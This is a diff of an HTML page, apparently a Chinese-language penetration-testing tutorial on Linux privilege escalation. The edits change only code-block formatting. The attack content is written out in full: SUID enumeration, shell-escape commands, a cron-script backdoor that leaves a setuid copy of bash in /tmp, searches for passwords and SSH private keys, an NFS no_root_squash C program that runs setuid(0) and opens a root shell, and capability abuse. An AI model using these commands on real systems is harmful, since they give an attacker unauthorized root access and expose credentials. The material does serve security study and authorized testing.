@@ -261,15 +261,15 @@
 <h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
 <li>Linux命令查找SUID文件</li>
 </ol>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
 <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-type</span> f <span class="token parameter variable">-exec</span> <span class="token function">ls</span> <span class="token parameter variable">-la</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token punctuation">\</span><span class="token punctuation">;</span>
-<span class="token function">find</span> / <span class="token parameter variable">-uid</span> <span class="token number">0</span> <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</code></pre>
+<span class="token function">find</span> / <span class="token parameter variable">-uid</span> <span class="token number">0</span> <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <ol start="2">
 <li>使用find命令以root权限命令执行</li>
 </ol>
 <p>Linux可以使用的命令提权姿势</p>
-<pre class="language-none"><code class="language-none">#Find
+<pre class="line-numbers language-none"><code class="language-none">#Find
 find pentestlab -exec whoami \;
 
 #Vim
@@ -288,7 +288,7 @@ bash -p
 less &#x2F;etc&#x2F;passwd
 
 #Nmap
-nmap --interactive</code></pre>
+nmap --interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="0x02-SUDO提权"><a href="#0x02-SUDO提权" class="headerlink" title="0x02 SUDO提权"></a>0x02 SUDO提权</h2><h3 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>sudo是linux系统管理指令，允许系统管理员让普通用户执行一些或者全部的root命令，如halt，reboot，su等等。sudo不是对shell的一个代替，它是面向每个命令的。</p>
 <p>它的特性主要有这样几点：</p>
@@ -305,11 +305,11 @@ nmap --interactive</code></pre>
 <ol start="2">
 <li>查看sudo权限</li>
 </ol>
-<pre class="language-none"><code class="language-none">grep -v -E &quot;^#&quot; &#x2F;etc&#x2F;passwd 2&gt;&#x2F;dev&#x2F;null| awk -F: &#39;$3 &#x3D;&#x3D; 0 &#123; print $1&#125;&#39; 2&gt;&#x2F;dev&#x2F;null
+<pre class="line-numbers language-none"><code class="language-none">grep -v -E &quot;^#&quot; &#x2F;etc&#x2F;passwd 2&gt;&#x2F;dev&#x2F;null| awk -F: &#39;$3 &#x3D;&#x3D; 0 &#123; print $1&#125;&#39; 2&gt;&#x2F;dev&#x2F;null
 
 grep -v -e &#39;^$&#39; &#x2F;etc&#x2F;sudoers 2&gt;&#x2F;dev&#x2F;null |grep -v &quot;#&quot; 2&gt;&#x2F;dev&#x2F;null
 
-echo &#39;&#39; | sudo -S -l -k 2&gt;&#x2F;dev&#x2F;null</code></pre>
+echo &#39;&#39; | sudo -S -l -k 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="0x03-计划任务提权"><a href="#0x03-计划任务提权" class="headerlink" title="0x03 计划任务提权"></a>0x03 计划任务提权</h2><h3 id="1-简介-2"><a href="#1-简介-2" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>如果未正确配置Cron，则可以利用它获得root特权。</p>
 <ol>
@@ -320,12 +320,12 @@ echo &#39;&#39; | sudo -S -l -k 2&gt;&#x2F;dev&#x2F;null</code></pre>
 <p>Cron通常以root特权运行。如果我们可以成功修改cron中的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。</p>
 <h3 id="2-漏洞利用-2"><a href="#2-漏洞利用-2" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
 <li><p>查看计划任务，找到有修改权限的计划任务脚本</p>
-<pre class="language-none"><code class="language-none">ls -l &#x2F;etc&#x2F;cron*
-more &#x2F;etc&#x2F;crontab</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">ls -l &#x2F;etc&#x2F;cron*
+more &#x2F;etc&#x2F;crontab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 </li>
 <li><p>在mysqlback.sh 添加 SUID shell后门，当定时任务以root再次执行的时候，可以获取root权限</p>
-<pre class="language-none"><code class="language-none">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shell
-chmod u+s &#x2F;tmp&#x2F;shell</code></pre></li>
+<pre class="line-numbers language-none"><code class="language-none">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shell
+chmod u+s &#x2F;tmp&#x2F;shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
 </ol>
 <h2 id="0x04-密码复用提权"><a href="#0x04-密码复用提权" class="headerlink" title="0x04 密码复用提权"></a>0x04 密码复用提权</h2><h3 id="1-简介-3"><a href="#1-简介-3" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>如数据库、后台 web 密码，其他配置文件出现的密码，可能就是 root 密码</p>
 <h3 id="2-漏洞利用-3"><a href="#2-漏洞利用-3" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ul>
@@ -333,7 +333,7 @@ chmod u+s &#x2F;tmp&#x2F;shell</code></pre></li>
 <li>检查Web服务器连接到数据库的文件（config.php或类似文件）</li>
 <li>检查数据库以获取可能被重用的管理员密码</li>
 </ul>
-<pre class="language-none"><code class="language-none">grep --color&#x3D;auto -rnw &#39;&#x2F;&#39; -ie &quot;PASSWORD&quot; --color&#x3D;always 2&gt; &#x2F;dev&#x2F;null
+<pre class="line-numbers language-none"><code class="language-none">grep --color&#x3D;auto -rnw &#39;&#x2F;&#39; -ie &quot;PASSWORD&quot; --color&#x3D;always 2&gt; &#x2F;dev&#x2F;null
 
 find . -type f -exec grep -i -I &quot;PASSWORD&quot; &#123;&#125; &#x2F;dev&#x2F;null \;
 
@@ -345,7 +345,7 @@ find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password
 
 find &#x2F; -name authorized_keys 2&gt; &#x2F;dev&#x2F;null
 
-find &#x2F; -name id_rsa 2&gt; &#x2F;dev&#x2F;null</code></pre>
+find &#x2F; -name id_rsa 2&gt; &#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="0x05-NFS提权"><a href="#0x05-NFS提权" class="headerlink" title="0x05 NFS提权"></a>0x05 NFS提权</h2><h3 id="1-简介-4"><a href="#1-简介-4" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>网络文件系统：网络文件系统允许客户端计算机上的用户通过网络挂载共享文件或目录。NFS使用远程过程调用（RPC）在客户端和服务器之间路由请求。<br>Root Squashing参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程root用户在连接时会分配一个用户“ nfsnobody ”，该用户具有最小的本地权限。如果 no_root_squash 选项开启的话的话”，并为远程用户授予root用户对所连接系统的访问权限。</p>
 <h3 id="2-漏洞利用-4"><a href="#2-漏洞利用-4" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
@@ -354,23 +354,23 @@ find &#x2F; -name id_rsa 2&gt; &#x2F;dev&#x2F;null</code></pre>
 <li><p>kali挂载远程目录</p>
 </li>
 <li><p>在&#x2F;tmp&#x2F;test文件夹下创建c文件</p>
-<pre class="language-none"><code class="language-none">#include &lt;stdio.h&gt; 
+<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt; 
 #include &lt;stdlib.h&gt; 
 #include &lt;sys&#x2F;types.h&gt; 
 #include &lt;unistd.h&gt; 
-int main() &#123; setuid(0); system(&quot;&#x2F;bin&#x2F;bash&quot;); return 0; &#125;</code></pre>
+int main() &#123; setuid(0); system(&quot;&#x2F;bin&#x2F;bash&quot;); return 0; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>编译</p>
-<pre class="language-none"><code class="language-none">gcc suid-shell.c -o suid-shell</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">gcc suid-shell.c -o suid-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </li>
 <li><p>回到目标主机&#x2F;tmp目录下执行suid-shell</p>
 </li>
 </ol>
-<pre class="language-none"><code class="language-none">chmod +s suid-shell</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">chmod +s suid-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <ol start="5">
 <li>执行</li>
 </ol>
-<pre class="language-none"><code class="language-none">.&#x2F;suid-shell</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;suid-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="0x06-Capabilities利用"><a href="#0x06-Capabilities利用" class="headerlink" title="0x06 Capabilities利用"></a>0x06 Capabilities利用</h2><h3 id="1-简介-5"><a href="#1-简介-5" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>linux中Capabilities的概念和suid类似，可以让普通用户授予超级用户的能力</p>
 <p><strong>Capabilities表</strong></p>
@@ -534,18 +534,18 @@ int main() &#123; setuid(0); system(&quot;&#x2F;bin&#x2F;bash&quot;); return 0; 
 <td align="left">允许触发一些能唤醒系统的东西(比如 CLOCKBOOTTIMEALARM 计时器)</td>
 </tr>
 </tbody></table>
-<h3 id="2-可用文件查找"><a href="#2-可用文件查找" class="headerlink" title="2. 可用文件查找"></a>2. 可用文件查找</h3><pre class="language-none"><code class="language-none">getcap -r &#x2F;usr&#x2F;bin
+<h3 id="2-可用文件查找"><a href="#2-可用文件查找" class="headerlink" title="2. 可用文件查找"></a>2. 可用文件查找</h3><pre class="line-numbers language-none"><code class="language-none">getcap -r &#x2F;usr&#x2F;bin
 
 setcap cap_net_raw+p &#x2F;bin&#x2F;*
 
 setcap cap_setuid+ep &#x2F;usr&#x2F;bin&#x2F;*
 
-grep -v &#39;^#\|none\|^$&#39; &#x2F;etc&#x2F;security&#x2F;capability.conf 2&gt;&#x2F;dev&#x2F;null</code></pre>
+grep -v &#39;^#\|none\|^$&#39; &#x2F;etc&#x2F;security&#x2F;capability.conf 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>可写权限文件查找</strong></p>
-<pre class="language-none"><code class="language-none">find &#x2F; -writable ! -user &#96;whoami&#96; -type f ! -path &quot;&#x2F;proc&#x2F;*&quot; ! -path &quot;&#x2F;sys&#x2F;*&quot; -exec ls -al &#123;&#125; \; 2&gt;&#x2F;dev&#x2F;null
+<pre class="line-numbers language-none"><code class="language-none">find &#x2F; -writable ! -user &#96;whoami&#96; -type f ! -path &quot;&#x2F;proc&#x2F;*&quot; ! -path &quot;&#x2F;sys&#x2F;*&quot; -exec ls -al &#123;&#125; \; 2&gt;&#x2F;dev&#x2F;null
 find &#x2F; -perm -2 -type f 2&gt;&#x2F;dev&#x2F;null
-find &#x2F; ! -path &quot;*&#x2F;proc&#x2F;*&quot; -perm -2 -type f -print 2&gt;&#x2F;dev&#x2F;null</code></pre>
+find &#x2F; ! -path &quot;*&#x2F;proc&#x2F;*&quot; -perm -2 -type f -print 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><p><strong>Paper</strong></p>
 <ul>
